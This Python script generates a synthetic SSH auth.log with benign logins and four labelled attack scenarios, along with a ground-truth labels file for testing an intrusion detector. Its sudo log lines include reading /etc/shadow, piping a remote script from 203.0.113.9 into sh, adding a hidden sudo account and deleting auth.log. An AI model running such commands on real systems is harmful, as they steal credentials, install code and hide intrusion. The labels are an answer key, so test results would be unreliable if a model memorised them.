#!/usr/bin/env python3
"""Generate a realistic sample auth.log (normal traffic + 4 attack scenarios) and ground-truth labels.

Deterministic (fixed seed) so results are reproducible.
    python gen_sample_log.py            -> sample/auth.log, sample/labels.json
"""
import json
import os
import random
from datetime import datetime, timedelta

rnd = random.Random(42)
HOST = "web01"
lines = []  # (datetime, text)


def ts(day, h, m, s=0):
    return datetime(2026, 9, day, h, m, s)


def add(dt, proc, msg, pid=True):
    stamp = f"{dt:%b} {dt.day:2d} {dt:%H:%M:%S}"
    tag = f"{proc}[{rnd.randint(1000, 30000)}]" if pid else proc
    lines.append((dt, f"{stamp} {HOST} {tag}: {msg}"))


def fail(dt, user, ip, invalid=False):
    add(dt, "sshd", f"Failed password for {'invalid user ' if invalid else ''}{user} from {ip} port {rnd.randint(30000, 60000)} ssh2")


def ok(dt, user, ip, method="password"):
    add(dt, "sshd", f"Accepted {method} for {user} from {ip} port {rnd.randint(30000, 60000)} ssh2")
    add(dt + timedelta(seconds=1), "sshd", f"pam_unix(sshd:session): session opened for user {user}(uid=1001) by (uid=0)")


def sudo(dt, user, cmd):
    add(dt, "sudo", f"   {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}", pid=False)


# ---------------- normal activity ----------------
ALICE, BOB, BACKUP = "10.0.0.21", "10.0.0.22", "10.0.0.5"
# alice: two typos then success (benign)
fail(ts(14, 8, 54, 10), "alice", ALICE); fail(ts(14, 8, 54, 20), "alice", ALICE); ok(ts(14, 8, 55, 2), "alice", ALICE)
ok(ts(14, 13, 10), "alice", ALICE, "publickey"); ok(ts(15, 9, 2), "alice", ALICE, "publickey")
# bob: forgets his password - 4 failures over 2 minutes, then success (near miss, must NOT alert)
for i in range(4):
    fail(ts(14, 14, 40, 0) + timedelta(seconds=35 * i), "bob", BOB)
ok(ts(14, 14, 45), "bob", BOB); ok(ts(14, 9, 30), "bob", BOB); ok(ts(15, 10, 15), "bob", BOB)
# nightly backup service account (legit but "off hours")
ok(ts(14, 2, 0, 3), "backup", BACKUP, "publickey"); ok(ts(15, 2, 0, 4), "backup", BACKUP, "publickey")
# benign admin commands
sudo(ts(14, 9, 0), "alice", "/usr/bin/apt update")
sudo(ts(14, 15, 20), "bob", "/usr/bin/systemctl restart nginx")
sudo(ts(15, 9, 5), "alice", "/usr/bin/cat /var/log/auth.log")
# internet background noise: one-off probes from random IPs (must NOT alert)
for i, ip in enumerate(["45.13.7.8", "91.200.12.4", "185.220.101.9", "62.210.5.77", "103.41.2.60"]):
    fail(ts(14, 5 + 3 * i, rnd.randint(0, 59), rnd.randint(0, 59)), "ubuntu", ip, invalid=True)
add(ts(14, 6, 0), "sshd", "Connection closed by 45.13.7.8 port 40000 [preauth]")

# ---------------- attack A: classic brute force on root ----------------
A = "198.51.100.23"
for i in range(30):
    fail(ts(14, 11, 7, 0) + timedelta(seconds=round(i * 1.3)), "root", A)

# ---------------- attack B: slow password spray (one attempt / 20s, many usernames) ----------------
B = "203.0.113.77"
for i, u in enumerate(["admin", "test", "oracle", "postgres", "ubuntu", "git"]):
    fail(ts(14, 16, 20, 0) + timedelta(seconds=20 * i), u, B, invalid=True)

# ---------------- attack C: brute force -> success -> post-exploitation (3 AM) ----------------
C = "192.0.2.99"
for i in range(12):
    fail(ts(15, 3, 40, 0) + timedelta(seconds=round(i * 2.5)), "alice", C)
ok(ts(15, 3, 41, 5), "alice", C)
sudo(ts(15, 3, 42, 10), "alice", "/usr/bin/cat /etc/shadow")
sudo(ts(15, 3, 43, 30), "alice", "/bin/bash -c 'curl -s http://203.0.113.9/x.sh | sh'")
sudo(ts(15, 3, 45, 0), "alice", "/usr/sbin/useradd -m -s /bin/bash -G sudo support")
sudo(ts(15, 3, 47, 15), "alice", "/bin/rm -f /var/log/auth.log")

lines.sort(key=lambda x: x[0])
os.makedirs("sample", exist_ok=True)
with open("sample/auth.log", "w") as f:
    f.write("\n".join(t for _, t in lines) + "\n")

# Ground truth: which (rule, entity) pairs a correct detector SHOULD raise.
labels = [
    {"rule": "brute_force", "entity": A},
    {"rule": "brute_force", "entity": C},
    {"rule": "user_enumeration", "entity": B},
    {"rule": "success_after_failures", "entity": C},
    {"rule": "off_hours_login", "entity": C},
    {"rule": "suspicious_command", "entity": "alice"},
    {"rule": "attack_chain", "entity": C},
]
with open("sample/labels.json", "w") as f:
    json.dump(labels, f, indent=2)
print(f"wrote sample/auth.log ({len(lines)} lines) and sample/labels.json ({len(labels)} expected alerts)")
